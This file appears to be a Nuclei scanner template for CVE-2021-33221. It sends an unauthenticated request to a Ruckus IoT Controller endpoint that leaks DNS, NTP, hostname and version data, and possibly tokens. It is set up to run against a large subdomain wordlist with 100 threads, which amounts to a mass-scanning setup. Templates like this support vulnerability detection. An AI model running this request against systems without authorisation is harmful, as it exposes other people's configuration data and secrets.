id: CVE-2021-33221

info:
  name: CommScope Ruckus IoT Controller Unauthenticated Service Details
  author: geeknik
  description: A 'service details' API endpoint discloses system and configuration information to an attacker without requiring authentication. This information includes DNS and NTP servers that the devices uses for time and host resolution. It also includes the internal hostname and IoT Controller version. A fully configured device in production may leak other, more sensitive information (API keys and tokens).
  reference: https://www.commscope.com/globalassets/digizuite/917216-faq-security-advisory-id-20210525-v1-0.pdf
  severity: medium
  tags: cve,cve2021,commscope,ruckus,debug

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        GET /service/v1/service-details HTTP/1.1
        Host: {{Subdomains}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept-Encoding: gzip, deflate
        Accept: */*
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "application/json"
      - type: word
        words:
          - "message"
          - "ok"
          - "data"
          - "dns"
          - "gateway"
        condition: and
      - type: status
        status:
          - 200
